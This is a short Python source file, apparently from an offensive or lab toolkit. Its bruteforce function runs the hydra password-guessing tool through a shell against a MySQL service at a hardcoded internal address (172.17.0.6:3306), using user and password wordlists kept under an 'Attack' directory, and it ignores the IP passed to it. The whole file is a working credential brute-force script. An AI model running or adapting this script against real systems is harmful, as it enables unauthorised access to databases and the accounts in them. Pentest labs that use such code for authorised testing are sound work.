from subprocess import Popen


def bruteforce(ip):
    ip = '172.17.0.6'
    service = 'mysql'
    port = 3306
    p1 = Popen(
        'hydra -I -L ./Attack/Hydra/user.txt -P ./Attack/Hydra/dic.txt -e sn -v -b json -o ./Attack/Hydra/info_list.json {}://{}:{}'.format(
            service, ip, port), shell=True)

    print(p1.communicate())
    return 'start scanning!'
